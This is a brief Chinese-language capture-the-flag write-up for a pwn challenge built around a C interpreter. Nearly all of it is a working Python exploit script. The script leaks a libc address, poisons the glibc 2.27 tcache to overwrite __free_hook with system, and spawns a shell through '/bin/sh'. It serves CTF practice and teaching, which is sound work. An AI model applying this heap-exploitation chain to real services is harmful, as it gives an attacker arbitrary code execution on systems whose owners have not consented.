# simpleinterpreter

> 这也是一道水题，题目写得很有趣，实现了一个 C 语言解释器。

在任意执行 C 代码且动态链接库版本为 2.27 的情况下，直接往 tcache 上打就行：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

code = b"""
main(){
    char *p1, *p2, *p3, *p4;
    p1 = malloc(0x520);
    p4 = malloc(0x520);
    free(p1);
    printf("%s\n", p1);
    p1 = malloc(0x70);
    p2 = malloc(0x70);
    free(p2);
    free(p1);
    read(0, p1, 8);
    p1 = malloc(0x70);
    p1 = malloc(0x70);
    read(0, p1, 8);
    read(0, p2, 8);

    free(p2);

    read(0, p4, 10);
}
"""

ru(b"Code size: ")
sl(i2b(len(code)))
ru(b"Please give me the code to interpret: ")
s(code)

libc_base = u64_ex(ru(b"\n", drop=True)) - 0x3EBCA0
lg("libc_base", libc_base)
s(p64(libc_base + libc.sym.__free_hook))
s(p64(libc_base + libc.sym.system))
s(p64(u64_ex(b"/bin/sh\x00")))

ia()
```
